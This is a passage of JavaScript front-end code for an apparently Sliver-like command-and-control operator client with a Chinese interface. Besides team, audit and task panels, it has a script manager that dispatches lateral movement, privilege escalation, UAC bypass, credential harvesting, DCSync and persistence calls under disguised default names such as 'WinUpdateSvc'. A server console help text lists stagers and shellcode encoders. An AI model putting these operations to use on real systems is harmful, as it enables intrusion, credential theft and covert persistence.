  content.innerHTML = `<div class="section-heading"><div><h3>External Builder 状态</h3><p>状态来自 Teamserver Builders RPC。上游未暴露实时日志，构建结果请进入“构建记录”查看。</p></div><button class="btn small" id="builder-builds">打开构建记录</button></div><div class="ext-list">${builders.map(builder => `<article class="ext-item"><div class="ext-item-main"><strong>${esc(builder.name)}</strong><span class="state online">已注册</span></div><div class="ext-meta"><span>操作员：${esc(builder.operatorName || '-')}</span><span>平台：${esc(builder.goos)}/${esc(builder.goarch)}</span><span>模板：${esc(builder.templates || '-')}</span></div></article>`).join('') || '<div class="empty-state">当前没有注册的 External Builder</div>'}</div>`;
  document.getElementById('builder-builds')?.addEventListener('click',openBuildsPanel);
}

let teamCenterState = { tab: 'connection', snapshot: null, audit: [], report: null };

async function openTeamCenter(tab = teamCenterState.tab) {
  teamCenterState.tab = tab;
  openViewPanel('_team', '团队与审计', '<div class="infra-loading"><span class="spinner"></span>正在读取团队状态...</div>');
  try { teamCenterState.snapshot = await App().GetTeamCenterSnapshot(); }
  catch (error) { document.getElementById('modal-body').innerHTML = rpcErrorHtml(error, '加载团队状态失败'); return; }
  renderTeamCenter();
}

function renderTeamCenter() {
  const tabs = [['connection','连接'],['operators','操作员'],['audit','审计时间线'],['notifications','通知'],['report','行动报告']];
  const state = teamCenterState;
  openViewPanel('_team', '团队与审计', `<div class="team-center"><div class="ext-tabs">${tabs.map(([id,label]) => `<button class="ext-tab${state.tab === id ? ' active' : ''}" data-team-tab="${id}">${label}</button>`).join('')}</div><div id="team-content"></div></div>`);
  document.querySelectorAll('[data-team-tab]').forEach(button => button.addEventListener('click', () => { state.tab = button.dataset.teamTab; renderTeamCenter(); }));
  const content = document.getElementById('team-content');
  if (state.tab === 'connection') renderTeamConnection(content);
  if (state.tab === 'operators') renderTeamOperators(content);
  if (state.tab === 'audit') renderAuditTimeline(content);
  if (state.tab === 'notifications') renderNotificationSettings(content);
  if (state.tab === 'report') renderActionReport(content);
}

function renderTeamConnection(content) {
  const snapshot = teamCenterState.snapshot || {};
  const online = (snapshot.operators || []).filter(operator => operator.online).length;
  content.innerHTML = `<div class="team-summary"><div><span>连接状态</span><strong class="${snapshot.connected ? 'status-alive' : 'status-dead'}">${snapshot.connected ? '已连接' : '未连接'}</strong></div><div><span>当前操作员</span><strong>${esc(snapshot.operator || '-')}</strong></div><div><span>在线操作员</span><strong>${online}</strong></div></div>${(snapshot.warnings || []).map(warning => `<div class="ext-risk">${esc(warning)}</div>`).join('')}<div class="task-note">连接地址和操作员配置路径不会进入报告或通知。</div>`;
}

function renderTeamOperators(content) {
  const operators = teamCenterState.snapshot?.operators || [];
  content.innerHTML = `<div class="section-heading"><div><h3>操作员状态</h3><p>状态来自当前 Teamserver 多人协作接口。</p></div><button class="btn small" id="team-refresh">刷新</button></div><div class="operator-grid">${operators.map(operator => `<div class="operator-row"><span class="agent-live-dot${operator.online ? '' : ' dead'}"></span><strong>${esc(operator.name)}</strong><span>${operator.online ? '在线' : '离线'}</span></div>`).join('') || '<div class="empty-state">暂无操作员数据</div>'}</div>`;
  document.getElementById('team-refresh')?.addEventListener('click', () => openTeamCenter('operators'));
}

async function loadAuditTimeline() {
  const filter = {
    operator: document.getElementById('audit-operator')?.value || '', action: document.getElementById('audit-action')?.value || '',
    target: document.getElementById('audit-target')?.value || '', since: document.getElementById('audit-since')?.value || '',
    until: document.getElementById('audit-until')?.value || '', limit: 500,
  };
  const table = document.getElementById('audit-results');
  table.innerHTML = '<div class="infra-loading"><span class="spinner"></span>正在查询...</div>';
  try { teamCenterState.audit = await App().QueryAuditTimeline(filter); drawAuditRows(table, teamCenterState.audit || []); }
  catch (error) { table.innerHTML = rpcErrorHtml(error, '查询审计时间线失败'); }
}

function drawAuditRows(container, entries) {
  container.innerHTML = entries.length ? `<div class="infra-table-wrap"><table class="data-table infra-table"><thead><tr><th>时间</th><th>操作员</th><th>操作</th><th>目标</th><th>结果</th><th>摘要</th></tr></thead><tbody>${entries.slice().reverse().map(entry => `<tr><td>${esc(new Date(entry.time).toLocaleString())}</td><td>${esc(entry.operator || '-')}</td><td>${esc(entry.action)}</td><td>${esc(entry.target)}</td><td>${esc(entry.outcome)}</td><td>${esc(entry.summary)}</td></tr>`).join('')}</tbody></table></div>` : '<div class="empty-state">当前筛选条件下暂无审计记录</div>';
}

function renderAuditTimeline(content) {
  content.innerHTML = `<div class="audit-filters"><label>操作员<input id="audit-operator"/></label><label>操作<input id="audit-action"/></label><label>目标<input id="audit-target"/></label><label>开始日期<input id="audit-since" type="date"/></label><label>结束日期<input id="audit-until" type="date"/></label><button class="btn accent" id="audit-query">查询</button></div><div class="task-note">审计时间线只返回安全摘要；服务器地址、命令正文、凭据、完整路径和原始错误均不展示。</div><div id="audit-results"></div>`;
  document.getElementById('audit-query')?.addEventListener('click', loadAuditTimeline);
  loadAuditTimeline();
}

function renderNotificationSettings(content) {
  const settings = notificationSettings;
  content.innerHTML = `<div class="notification-form"><label class="check-label"><input id="notify-enabled" type="checkbox" ${settings.enabled ? 'checked' : ''}/> 启用应用内通知</label><label>最低级别<select id="notify-level"><option value="info">信息</option><option value="warning">警告</option><option value="critical">严重</option></select></label><fieldset><legend>通知类别</legend><label class="check-label"><input id="notify-agent" type="checkbox" ${settings.categories.agent ? 'checked' : ''}/> Session / Beacon 上线</label><label class="check-label"><input id="notify-task" type="checkbox" ${settings.categories.task ? 'checked' : ''}/> 任务失败</label><label class="check-label"><input id="notify-listener" type="checkbox" ${settings.categories.listener ? 'checked' : ''}/> Listener 异常</label></fieldset><div class="quiet-row"><label>静默开始<input id="notify-quiet-start" type="time" value="${esc(settings.quietStart)}"/></label><label>静默结束<input id="notify-quiet-end" type="time" value="${esc(settings.quietEnd)}"/></label></div><label class="check-label"><input id="notify-desktop" type="checkbox" ${settings.desktop ? 'checked' : ''}/> 启用 Windows 桌面通知</label><div class="ext-actions"><button class="btn accent" id="notify-save">保存设置</button><button class="btn small" id="notify-test">测试通知</button></div><div class="task-note">桌面通知仅在显式启用后申请系统权限。Listener 异常为客户端对活动 Job 列表的观察结果。</div></div>`;
  document.getElementById('notify-level').value = settings.minimumLevel;
  document.getElementById('notify-save')?.addEventListener('click', async () => {
    const desktop = document.getElementById('notify-desktop').checked;
    if (desktop && 'Notification' in window && Notification.permission === 'default') {
      const permission = await Notification.requestPermission();
      if (permission !== 'granted') { document.getElementById('notify-desktop').checked = false; toast('info','未启用桌面通知权限'); }
    }
    notificationSettings = {
      enabled: document.getElementById('notify-enabled').checked, desktop: document.getElementById('notify-desktop').checked,
      minimumLevel: document.getElementById('notify-level').value, quietStart: document.getElementById('notify-quiet-start').value,
      quietEnd: document.getElementById('notify-quiet-end').value,
      categories: { agent: document.getElementById('notify-agent').checked, task: document.getElementById('notify-task').checked, listener: document.getElementById('notify-listener').checked },
    };
    saveNotificationSettings(); toast('ok','通知设置已保存');
  });
  document.getElementById('notify-test')?.addEventListener('click', () => notifyOperational({ category:'agent', level:'info', title:'通知测试', message:'通知规则工作正常', tag:'notification-test' }));
}

function reportRequest(redactOperational) {
  return {
    redactOperational,
    tasks: taskStore.list().map(task => ({ type:task.type, title:task.title, target:task.target, status:task.status, startedAt:task.startedAt, finishedAt:task.finishedAt || 0, summary:task.summary })),
    events: eventLog.map(event => ({ time:event.time, type:event.type })),
  };
}

async function buildReportPreview(redactOperational) {
  const box = document.getElementById('report-preview');
  box.innerHTML = '<div class="infra-loading"><span class="spinner"></span>正在关联任务、IOC、Loot、Host 和时间线...</div>';
  try { teamCenterState.report = await App().BuildActionReport(reportRequest(redactOperational)); drawReportPreview(box, teamCenterState.report); }
  catch (error) { box.innerHTML = rpcErrorHtml(error, '生成报告预览失败'); }
}

function drawReportPreview(container, preview) {
  const findings = (preview.findings || []).map(finding => `<span>${esc(finding.kind)}：${finding.count}</span>`).join('') || '<span>未发现额外敏感项</span>';
  container.innerHTML = `<div class="report-findings"><strong>导出前敏感检查</strong>${findings}</div>${(preview.warnings || []).map(warning => `<div class="ext-risk">${esc(warning)}</div>`).join('')}<pre class="scr-output report-output">${esc(preview.markdown)}</pre>`;
}

function renderActionReport(content) {
  content.innerHTML = `<div class="section-heading"><div><h3>行动报告</h3><p>关联本次运行任务、IOC、Teamserver Loot、Host 和安全审计时间线。</p></div></div><div class="report-toolbar"><label class="check-label"><input id="report-redact-operational" type="checkbox" checked/> 额外隐藏目标标识和 IOC 路径</label><button class="btn accent" id="report-build">刷新预览</button><button class="btn small" id="report-copy" disabled>复制报告</button><button class="btn small" id="report-console" disabled>输出到控制台</button></div><div class="task-note">凭据、Token、私钥、连接地址、命令正文、完整本地路径和原始后端错误始终不导出。</div><div id="report-preview"></div>`;
  const rebuild = async () => { await buildReportPreview(document.getElementById('report-redact-operational').checked); const ready = Boolean(teamCenterState.report?.markdown); document.getElementById('report-copy').disabled = !ready; document.getElementById('report-console').disabled = !ready; };
  document.getElementById('report-build')?.addEventListener('click', rebuild);
  document.getElementById('report-redact-operational')?.addEventListener('change', rebuild);
  document.getElementById('report-copy')?.addEventListener('click', async () => { await navigator.clipboard.writeText(teamCenterState.report?.markdown || ''); toast('ok','报告已复制到剪贴板'); });
  document.getElementById('report-console')?.addEventListener('click', () => outputReportToConsole(teamCenterState.report?.markdown || ''));
  rebuild();
}

function outputReportToConsole(report) {
  const out = activeInteractId ? document.querySelector(`#ip-${activeInteractId} .console-out`) : null;
  if (!out) return toast('info','请先打开一个目标控制台');
  const block = document.createElement('div'); block.className = 'out'; block.style.whiteSpace = 'pre-wrap'; block.textContent = report;
  out.appendChild(block); out.scrollTop = out.scrollHeight; hideModal(); toast('ok','报告已输出到控制台');
}

const taskStatusMeta = {
  queued: { label: '排队中', cls: 'queued' },
  running: { label: '运行中', cls: 'running' },
  waiting: { label: '等待回连', cls: 'waiting' },
  success: { label: '成功', cls: 'success' },
  failed: { label: '失败', cls: 'failed' },
  cancelled: { label: '已取消', cls: 'cancelled' },
};

function formatTaskTime(timestamp) {
  return timestamp ? new Date(timestamp).toLocaleTimeString() : '-';
}

function formatTaskDuration(task) {
  const seconds = Math.floor(TaskStore.durationMs(task) / 1000);
  if (seconds < 60) return `${seconds} 秒`;
  const minutes = Math.floor(seconds / 60);
  return `${minutes} 分 ${seconds % 60} 秒`;
}

function renderTaskCenter() {
  const list = document.getElementById('task-center-list');
  if (!list) return;
  document.querySelectorAll('[data-task-filter]').forEach(button => {
    button.classList.toggle('active', button.dataset.taskFilter === taskCenterFilter);
  });
  const agentId = document.querySelector('.task-center')?.dataset.taskAgent || '';
  const tasks = taskStore.list(taskCenterFilter).filter(task => !agentId || task.agentId === agentId);
  if (!tasks.length) {
    list.innerHTML = '<div class="task-empty">当前筛选条件下暂无任务。</div>';
    return;
  }
  list.innerHTML = `<div class="task-table-wrap"><table class="data-table task-table">
    <thead><tr><th>状态</th><th>任务</th><th>目标</th><th>开始时间</th><th>耗时</th><th>结果摘要</th><th>操作</th></tr></thead>
    <tbody>${tasks.map(task => {
      const status = taskStatusMeta[task.status] || { label: task.status, cls: 'queued' };
      const remoteId = task.remoteTaskId ? `<div class="task-remote-id">${esc(task.remoteTaskId.slice(0, 12))}</div>` : '';
      const policy = task.policy ? `<div class="task-policy" title="${esc(task.policy)}">${esc(task.policy)}</div>` : '';
      const actions = `${task.canCancel ? `<button class="btn small danger" data-task-cancel="${esc(task.id)}">取消</button>` : ''}${task.canRetry ? `<button class="btn small" data-task-retry="${esc(task.id)}">重试</button>` : ''}` || '-';
      return `<tr><td><span class="task-status ${status.cls}">${status.label}</span></td>
        <td><strong>${esc(task.title)}</strong>${remoteId}</td><td>${esc(task.target)}</td>
        <td>${esc(formatTaskTime(task.startedAt))}</td><td>${esc(formatTaskDuration(task))}</td>
        <td class="task-summary">${esc(task.summary || '-')}${policy}</td><td class="task-actions">${actions}</td></tr>`;
    }).join('')}</tbody></table></div>`;
}

function openTaskCenter(agentId = '') {
  const filters = [
    ['all', '全部'], ['active', '进行中'], ['completed', '已完成'], ['failed', '失败/取消'],
  ];
  const content = `<div class="task-center" data-task-agent="${esc(agentId)}">
    <div class="task-toolbar">
      <div class="task-filters">${filters.map(([value, label]) => `<button class="vb-btn" data-task-filter="${value}">${label}</button>`).join('')}</div>
      <span class="spacer"></span><button class="btn small" id="task-clear-completed">清理已结束</button>
    </div>
    <div class="task-note">仅保留本次运行中最近 100 条任务，不记录命令正文、C2 URL 或原始错误详情。</div>
    <div id="task-center-list"></div>
  </div>`;
  openViewPanel('_tasks', '任务中心', content);
  document.querySelectorAll('[data-task-filter]').forEach(button => button.addEventListener('click', () => {
    taskCenterFilter = button.dataset.taskFilter;
    renderTaskCenter();
  }));
  document.getElementById('task-clear-completed')?.addEventListener('click', () => taskStore.clearCompleted());
  document.getElementById('task-center-list')?.addEventListener('click', event => {
    const cancelButton = event.target.closest('[data-task-cancel]');
    const retryButton = event.target.closest('[data-task-retry]');
    if (cancelButton) cancelTask(cancelButton.dataset.taskCancel);
    if (retryButton) retryTask(retryButton.dataset.taskRetry);
  });
  renderTaskCenter();
}
taskStore.subscribe(tasks => {
  renderTaskCenter();
  tasks.forEach(task => {
    const previous = taskNotificationStates.get(task.id);
    if (task.status === 'failed' && previous !== 'failed') {
      notifyOperational({ category:'task', level:'critical', title:'任务失败', message:`${task.title || '任务'}执行失败`, tag:`task-${task.id}` });
    }
    taskNotificationStates.set(task.id, task.status);
  });
});

// ── Script Manager Panel (Cobalt Strike-style lateral movement / privesc / persistence) ──
// ── Script Manager Panel (Cobalt Strike-style lateral movement / privesc / persistence) ──
async function openScriptsPanel() {
  const scripts = await App().ListScripts().catch(() => []);
  const sessions = allSessions.filter(s => s.id);

  // Group by category
  const cats = {};
  scripts.forEach(s => {
    if (!cats[s.category]) cats[s.category] = [];
    cats[s.category].push(s);
  });

  let sessionOpts = '<option value="">-- 选择跳板会话 --</option>';
  sessions.forEach(s => {
    sessionOpts += `<option value="${s.id}">${s.hostname || s.id.slice(0,8)} (${s.remoteAddress})</option>`;
  });

  let html = `<div class="scripts-panel">
    <div class="scr-top-bar">
      <div style="flex:1">
        <label style="color:var(--cyan);font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase">跳板会话</label>
        <select id="scr-session" class="scr-input">${sessionOpts}</select>
      </div>
    </div>

    <div class="scr-main-layout">
      <!-- Left Pane: Categories & Recipe Form -->
      <div class="scr-left-pane">
        <!-- Parameter / Action Card -->
        <div id="scr-param-card" class="scr-param-card" style="display:none">
          <h3 id="scr-card-title"></h3>
          <p id="scr-card-desc"></p>
          <div id="scr-form-grid" class="scr-form-grid"></div>
          <div class="scr-actions">
            <button id="scr-btn-preview" class="scr-action-btn scr-btn-preview">预览 / 模拟运行</button>
            <button id="scr-btn-exec" class="scr-action-btn scr-btn-exec">执行脚本</button>
          </div>
        </div>

        <!-- Script Categories Grid -->
        <div class="scr-categories">`;

  for (const [cat, items] of Object.entries(cats)) {
    html += `<div class="scr-cat"><h4>${cat}</h4><div class="scr-btns">`;
    items.forEach(s => {
      const attckBadge = s.attck ? `<span class="badge-attck">${esc(s.attck)}</span>` : '';
      const opsecClass = (s.opsec || 'low').toLowerCase();
      const opsecBadge = s.opsec ? `<span class="badge-opsec opsec-${opsecClass}">${esc(s.opsec)}</span>` : '';
      html += `<button class="scr-btn" data-method="${esc(s.method)}" title="${esc(s.description)}">
        <span>${esc(s.name)}</span> ${attckBadge} ${opsecBadge}
      </button>`;
    });
    html += `</div></div>`;
  }

  html += `  </div>
      </div>

      <!-- Right Pane: Output / Preview Console -->
      <div class="scr-right-pane">
        <div class="scr-output-wrap">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
            <label style="color:var(--cyan);font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase">控制台输出 / 预览</label>
            <button class="btn small" onclick="document.getElementById('scr-output').textContent='请选择脚本，然后点击预览或执行...';">清空</button>
          </div>
          <pre id="scr-output" class="scr-output">请在左侧选择脚本方案，配置参数后运行...</pre>
        </div>
      </div>
    </div>
  </div>`;

  openViewPanel('scripts', '脚本管理器', html);

  // Script selection state
  let currentScript = null;

  const scriptMap = {};
  scripts.forEach(s => { scriptMap[s.method] = s; });

  const paramCard = document.getElementById('scr-param-card');
  const cardTitle = document.getElementById('scr-card-title');
  const cardDesc = document.getElementById('scr-card-desc');
  const formGrid = document.getElementById('scr-form-grid');
  const btnPreview = document.getElementById('scr-btn-preview');
  const btnExec = document.getElementById('scr-btn-exec');
  const out = document.getElementById('scr-output');

  function selectScript(method) {
    const s = scriptMap[method];
    if (!s) return;
    currentScript = s;

    // Update active button state
    document.querySelectorAll('.scr-btn').forEach(b => {
      b.classList.toggle('active', b.dataset.method === method);
    });

    // Header info
    const attckBadge = s.attck ? `<span class="badge-attck">${esc(s.attck)}</span>` : '';
    const opsecClass = (s.opsec || 'low').toLowerCase();
    const opsecBadge = s.opsec ? `<span class="badge-opsec opsec-${opsecClass}">${esc(s.opsec)} 噪声</span>` : '';
    cardTitle.innerHTML = `${esc(s.name)} ${attckBadge} ${opsecBadge}`;
    cardDesc.textContent = s.description;

    // Build parameter form fields
    formGrid.innerHTML = '';
    if (s.params && s.params.length > 0) {
      s.params.forEach(p => {
        const field = document.createElement('div');
        let inputHtml = '';
        if (p.type === 'select') {
          const optsHtml = (p.options || []).map(o => `<option value="${esc(o)}" ${o === p.default ? 'selected' : ''}>${esc(o)}</option>`).join('');
          inputHtml = `<select id="scr-field-${esc(p.name)}" class="scr-input">${optsHtml}</select>`;
        } else {
          const inputType = p.type === 'password' ? 'password' : (p.type === 'number' ? 'number' : 'text');
          const val = p.default || '';
          const ph = p.placeholder || '';
          inputHtml = `<input id="scr-field-${esc(p.name)}" type="${inputType}" class="scr-input" value="${esc(val)}" placeholder="${esc(ph)}" />`;
        }
        field.innerHTML = `<label style="color:var(--muted);font-size:11px;font-weight:600">${esc(p.label).toUpperCase()} ${p.required ? '<span style="color:var(--accent)">*</span>' : ''}</label>${inputHtml}`;
        formGrid.appendChild(field);
      });
    } else {
      formGrid.innerHTML = '<div style="color:var(--muted);font-size:11.5px;grid-column:1/-1">无需额外参数。点击“预览”或“执行”，在所选跳板会话上运行。</div>';
    }

    paramCard.style.display = 'block';
  }

  function getParamMap() {
    if (!currentScript) return {};
    const map = {};
    if (currentScript.params) {
      currentScript.params.forEach(p => {
        const el = document.getElementById(`scr-field-${p.name}`);
        if (el) map[p.name] = el.value;
      });
    }
    return map;
  }

  // Bind category button clicks
  document.querySelectorAll('.scr-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      selectScript(btn.dataset.method);
    });
  });

  // Select first script by default if available
  if (scripts.length > 0) {
    selectScript(scripts[0].method);
  }

  // Preview button handler
  btnPreview.addEventListener('click', async () => {
    if (!currentScript) return;
    const sid = document.getElementById('scr-session').value;
    if (!sid) { out.textContent = '[!] 请先选择跳板会话'; return; }

    out.textContent = `[*] 正在为 ${currentScript.name} 生成模拟运行预览...`;
    btnPreview.disabled = true;
    try {
      const pmap = getParamMap();
      const res = await App().ScriptPreview(sid, currentScript.method, pmap);
      if (res.error) {
        out.textContent = `[错误] ${rpcErrorMessage(res.error, '脚本预览失败')}`;
        out.style.color = 'var(--accent)';
      } else {
        out.textContent = res.output;
        out.style.color = 'var(--cyan)';
      }
    } catch (e) {
      out.textContent = `[错误] ${rpcErrorMessage(e, '脚本预览失败')}`;
      out.style.color = 'var(--accent)';
    }
    btnPreview.disabled = false;
    out.scrollTop = 0;
  });

  // Execute button handler
  btnExec.addEventListener('click', async () => {
    if (!currentScript) return;
    const sid = document.getElementById('scr-session').value;
    if (!sid) { out.textContent = '[!] 请先选择跳板会话'; return; }

    const method = currentScript.method;
    const pmap = getParamMap();

    out.textContent = `[*] 正在执行 ${currentScript.name}...`;
    btnExec.disabled = true;

    let result;
    try {
      switch (method) {
        case 'ScriptSpawnLocal':
          result = await App().ScriptSpawnLocal(sid, pmap.targetOS || 'windows', pmap.arch || 'amd64', pmap.profileName || '');
          if (!result.error) renderGraph();
          break;
        case 'ScriptSSHDeploy':
          result = await App().ScriptSSHDeploy(sid, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '', pmap.beaconPath || '');
          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptSpawnLinux':
          result = await App().ScriptSpawnLinux(sid, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '', pmap.listenerURL || '');
          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptSSHExecSimple':
          result = await App().ScriptSSHExecSimple(sid, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '', pmap.command || 'id');
          break;
        case 'ScriptSSHCheck':
          result = await App().ScriptSSHCheck(sid, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '');
          break;
        case 'ScriptSpawnWindows':
          result = await App().ScriptSpawnWindows(sid, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.listenerURL || '');
          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptPsExec':
          result = await App().ScriptPsExec(sid, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.beaconPath || '');
          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptWMIExec':
          result = await App().ScriptWMIExec(sid, pmap.targetHost || '', 135, pmap.user || 'Administrator', pmap.pass || '', pmap.command || 'whoami');
          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptWinRMExec':
          result = await App().ScriptWinRMExec(sid, pmap.targetHost || '', 5985, pmap.user || 'Administrator', pmap.pass || '', pmap.command || 'whoami; hostname');
          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptSCDeploy':
          result = await App().ScriptSCDeploy(sid, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.beaconPath || '');
          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptSMBUploadExec':
          result = await App().ScriptSMBUploadExec(sid, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.beaconPath || '');
          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptPrivescCheck':
          result = await App().ScriptPrivescCheck(sid);
          break;
        case 'ScriptSudoExploit':
          result = await App().ScriptSudoExploit(sid, pmap.method || 'find');
          break;
        case 'ScriptWinPrivescCheck':
          result = await App().ScriptWinPrivescCheck(sid);
          break;
        case 'ScriptTokenImpersonate':
          result = await App().ScriptTokenImpersonate(sid, pmap.targetUser || '');
          break;
        case 'ScriptGetSystem':
          result = await App().ScriptGetSystem(sid, pmap.profile || '');
          break;
        case 'ScriptUACBypass':
          result = await App().ScriptUACBypass(sid, pmap.beaconPath || '');
          break;
        case 'ScriptPersistCron':
          result = await App().ScriptPersistCron(sid, pmap.cronLine || '');
          break;
        case 'ScriptPersistSSHKey':
          result = await App().ScriptPersistSSHKey(sid, pmap.pubKey || '', pmap.targetUser || 'root');
          break;
        case 'ScriptPersistSystemd':
          result = await App().ScriptPersistSystemd(sid, pmap.serviceName || 'system-update', pmap.execPath || '/tmp/.svc');
          break;
        case 'ScriptPersistRegRun':
          result = await App().ScriptPersistRegRun(sid, pmap.beaconPath || '', pmap.name || 'SecurityUpdate');
          break;
        case 'ScriptPersistSchedTask':
          result = await App().ScriptPersistSchedTask(sid, pmap.beaconPath || '', pmap.taskName || '');
          break;
        case 'ScriptPersistService':
          result = await App().ScriptPersistService(sid, pmap.beaconPath || '', pmap.svcName || 'WinUpdateSvc');
          break;
        case 'ScriptPersistWMI':
          result = await App().ScriptPersistWMI(sid, pmap.beaconPath || '');
          break;
        case 'ScriptPersistStartup':
          result = await App().ScriptPersistStartup(sid, pmap.beaconPath || '');
          break;
        case 'ScriptHarvestCreds':
          result = await App().ScriptHarvestCreds(sid);
          break;
        case 'ScriptWinHarvestCreds':
          result = await App().ScriptWinHarvestCreds(sid);
          break;
        case 'ScriptKerberoast':
          result = await App().ScriptKerberoast(sid);
          break;
        case 'ScriptDCSync':
          result = await App().ScriptDCSync(sid);
          break;
        case 'ScriptNetworkScan':
          result = await App().ScriptNetworkScan(sid, pmap.subnet || '192.168.50', pmap.ports || '22 445 3306 2375 3000');
          break;
        case 'ScriptADEnum':
          result = await App().ScriptADEnum(sid);
          break;
        case 'ScriptWinLocalEnum':
          result = await App().ScriptWinLocalEnum(sid);
          break;
        default:
          result = { error: '未知脚本：' + method };
      }
    } catch (e) {
      result = { error: e };
    }

    btnExec.disabled = false;
    if (result.error) {
      out.textContent = `[错误] ${rpcErrorMessage(result.error, '执行脚本失败')}\n\n${result.output || ''}`;
      out.style.color = 'var(--accent)';
    } else {
      out.textContent = `[+] ${result.output || '完成'}`;
      out.style.color = 'var(--ok)';
      // Lineage is recorded per-method above (only for agent-deploying recipes),
      // using the correct {parentID, parentHost} record format. No catch-all here.
    }
    setTimeout(() => { out.style.color = ''; }, 5000);
    out.scrollTop = out.scrollHeight;
  });
}

function pinScripts() {
  hideModal();
  const id = '_scripts_dock';
  if (openTabs[id]) { activateTab(id); return; }
  openTabs[id] = { kind: 'dock' };
  document.getElementById('empty-interact')?.remove();
  const tab = document.createElement('button'); tab.className = 'interact-tab'; tab.dataset.tid = id;
  tab.innerHTML = `<span>脚本</span><span class="close-x" data-cid="${id}">x</span>`;
  tab.addEventListener('click', e => { if (e.target.dataset.cid) closeTab(e.target.dataset.cid); else activateTab(id); });
  document.getElementById('interact-tabs').appendChild(tab);
  const panel = document.createElement('div'); panel.className = 'interact-panel'; panel.id = `ip-${id}`;
  panel.innerHTML = `<div style="overflow:auto;flex:1" id="scripts-dock-content">正在加载脚本管理器...</div>`;
  document.getElementById('interact-panels').appendChild(panel);
  activateTab(id);
  openScriptsPanel().then(() => {
    const modalBody = document.getElementById('modal-body');
    const dockContent = document.getElementById('scripts-dock-content');
    if (modalBody && dockContent) {
      dockContent.innerHTML = modalBody.innerHTML;
      hideModal();
    }
  });
}
document.getElementById('modal-overlay').addEventListener('click', e => { if (e.target.id === 'modal-overlay') hideModal(); });
document.addEventListener('keydown', e => { if (e.key === 'Escape') hideModal(); });

// ── Operator notes (per agent, in-memory) ───────────────────────────────────
document.getElementById('notes-btn').addEventListener('click', openNotes);
function openNotes() {
  if (!activeInteractId) return toast('info', '请先打开代理（双击会话或信标）');
  const t = openTabs[activeInteractId], o = t && t.obj;
  const title = `笔记 - ${o ? (o.hostname || o.id.slice(0,8)) : activeInteractId}`;
  openViewPanel('_notes', title,
    `<p style="color:var(--muted);font-size:12px;margin-bottom:8px">笔记按代理分别保存到本机，并按团队服务器隔离；重新连接后会自动恢复，输入时自动保存。</p>
     <textarea id="notes-area" class="notes-area" placeholder="发现的凭据、后续步骤、IOC、待办事项...">${esc(notesMap[activeInteractId] || '')}</textarea>`);
  const ta = document.getElementById('notes-area');
  ta.addEventListener('input', () => { notesMap[activeInteractId] = ta.value; markNoted(activeInteractId); saveState(); });
  setTimeout(() => ta.focus(), 30);
}
// markNoted adds a small dot to a tab that has notes.
function markNoted(id) {
  const tab = document.querySelector(`.interact-tab[data-tid="${id}"] span`);
  if (tab && notesMap[id] && notesMap[id].trim() && !tab.textContent.startsWith('•')) tab.textContent = '• ' + tab.textContent;
}

// ── Server console (teamserver commands, pinned like the event log) ──────────
const SERVER_HELP = `Server console — runs teamserver commands (NOT on a target).
  help                     this help
  version                  teamserver version
  sessions                 list sessions
  beacons                  list beacons
  jobs | listeners         list active listeners
  jobs kill <id>           kill a listener/job
  operators | players      list operators
  loot [rm <id> | rename <id> <name>]   list / remove / rename loot
  hosts [rm <id> | ioc-rm <ioc-id>]     list / remove hosts / remove host IOC
  creds [add <u> <p> | rm <id>]   list / add / remove credentials
  builds                   list implant builds
  regenerate <name>        re-download a previous build
  profiles                 list implant profiles
  websites [rm <name>]     list / remove hosted websites
  canaries                 list DNS canaries (tripwires)
  stager <host> <port> <profile>   start a TCP stager listener
  use <id-prefix>          interact with a session/beacon
  c2profiles               list HTTP C2 profiles
  c2profile <name>         view a full HTTP C2 profile (JSON)
  c2profile edit <name>    open the HTTP C2 profile editor
  c2profile new            create a new HTTP C2 profile
  certificates | ca        list issued / CA certificates
  compiler                 teamserver build capabilities
  builders                 external build servers
  traffic-encoders         list WASM traffic encoders
  shellcode-encoders       list shellcode encoders
  armory                   list available armory packages
  armory install <name>    install an armory package
  armory remove <name>     remove an armory package
  shellcode-rdi <dll> <func> [args]   convert a DLL to shellcode (sRDI)
  shellcode-encode <bin> [arch] [iter]   encode shellcode (shikata-ga-nai)
  monitor [start|stop|list|add <type> <key>|del <id>]  threat-monitoring
  website add|update <site> <web-path> <local-file> | rm <site> <web-path>
  pivots | pivot-graph     show the pivot (peer) topology
  wg-client-config         generate a WireGuard client config
  wg-unique-ip             allocate a unique WireGuard peer IP
  creds [add|rm|update <id> <plain>|sniff <hash>|get <id>]   credential store
  restart-jobs <id...>     restart listener jobs
  rename <id> <name>       rename a session
  kill-session <id>        kill a session
  kill-beacon <id>         remove a beacon
  mtls [port]              start an mTLS listener (default 8443)
  http [port]              start an HTTP listener (default 80)
  https [port]             start an HTTPS listener (default 443)
  dns <domain...>          start a DNS listener
  wg [port] [nport] [key]  start a WireGuard listener
  clear                    clear this console`;

const SERVER_COMMAND_SCHEMA = {
  commands: [
    'help','clear','version','sessions','beacons','jobs','listeners','operators','players','loot','hosts','creds',
